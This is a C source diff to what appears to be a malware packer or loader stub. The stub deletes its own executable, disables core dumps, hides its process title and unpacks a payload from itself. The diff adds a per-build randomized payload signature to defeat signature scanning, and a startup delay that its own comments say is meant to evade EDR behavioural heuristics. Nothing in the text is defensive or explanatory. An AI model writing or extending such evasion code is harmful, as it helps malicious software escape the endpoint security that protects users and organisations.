@@ -231,9 +231,13 @@ pack_header_t* find_packed_header(const uint8_t* data, size_t data_size) {
     if (data_size < sizeof(pack_header_t)) {
         return NULL;
     }
+    /* g_packed_magic is patched per-pack by stubgen, so the magic value
+     * we scan for differs in every output. The volatile load defeats
+     * compiler folding and forces a runtime read from .data. */
+    uint32_t needle = g_packed_magic;
     for (size_t i = data_size - sizeof(pack_header_t); i > 0; i--) {
         pack_header_t* header = (pack_header_t*)(data + i);
-        if (header->magic == PACKED_MAGIC) {
+        if (header->magic == needle) {
             return header;
         }
     }
@@ -252,6 +256,11 @@ int main(int argc, char* argv[], char* envp[]) {
     unlink(argv[0]);
     prevent_core_dumps();
     hide_process_title(argc, argv);
+
+    /* Behavioral noise: a short randomized delay at startup breaks the
+     * "process_start -> immediate suspicious syscalls" tight pattern
+     * heuristic EDRs key on. Cost is paid once per execution. */
+    noise_delay(150);
 
     self_fp = fopen("/proc/self/exe", "rb");
     if (!self_fp) {
